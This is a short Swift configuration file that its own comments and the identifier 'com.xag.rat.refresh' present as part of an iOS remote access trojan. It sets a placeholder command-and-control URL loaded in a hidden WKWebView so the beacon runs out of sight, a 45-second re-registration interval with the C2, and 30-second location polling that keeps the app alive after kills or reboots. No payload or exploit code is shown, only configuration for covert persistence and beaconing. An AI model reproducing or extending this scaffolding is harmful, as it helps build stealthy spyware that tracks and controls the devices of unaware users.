import Foundation

enum Cfg {
    // The C2 landing page that runs the main-thread agent. The native app
    // embeds this in a hidden WKWebView so the beacon runs out-of-process.
    static let c2URL = "your url"

    // Re-register with the C2 at least this often (seconds) so a background
    // refresh keeps the DO warm even if the app is suspended.
    static let refreshInterval: TimeInterval = 45

    // Background-keepalive location interval (seconds). Drains battery but
    // gives a reliable reboot/kill relaunch path without a push backend.
    static let locationInterval: TimeInterval = 30

    static let bgTaskID = "com.xag.rat.refresh"
}
